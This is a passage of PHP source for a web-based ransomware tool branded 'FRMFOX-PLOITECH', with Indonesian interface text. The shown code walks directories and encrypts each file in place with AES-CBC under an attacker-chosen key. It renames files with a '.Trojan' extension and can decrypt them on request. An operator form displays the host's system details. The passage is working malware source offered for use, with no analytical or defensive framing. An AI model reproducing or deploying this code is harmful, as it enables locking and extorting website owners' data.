                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
   }
   
   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".Trojan");
        break;
        case '2':
          $locates = str_replace(".Trojan", "", $locate);
          rename($locate, $locates);
        break;
      }
   }
   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );
      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }
   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }
   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}
if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<pre>
<color="white"><img width="400" src="https://l.top4top.io/p_1808v27y10.png" ></font>

 . : FRMFOX-PLOITECH : .
 
 System :  <?php echo php_uname()."\n";?>
 Server : <?=$_SERVER['HTTP_HOST']."\n";?>
 #Ransomware Ini Berada Pada [dir]: <?php echo
 getcwd();?>/<?php $current_file_name =
 basename($_SERVER['PHP_SELF']); echo
 $current_file_name."\n"; ?>
 </font>	
</pre>

<h2><font color='red' face = 'iceland' > Masukkan Kunci Enkripsi / Dekripsi Anda Di Sini</h2> </font>

<form action="" method="post" style=" text-align: center;">
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC"><br><br>
	  <h2><font color='lime' face = 'iceland' > Post Type : </h2> </font> 
     <select name="method" class="selecte">
         <option value="1">Encrypt Key!</option>
         <option value="2">Decrypt Key!</option>
      </select><br><br><br><br><br>
      <input type="submit" name="submit" class="submite" value="Key Website" />
</form>

<?php
}?>

<br><br><br>

<hr>
 <br><br><br>
 <font color = 'red'>© 2020 FRMFOX-PLOITECH</font>
 </center>
 </div>
</body>
</html>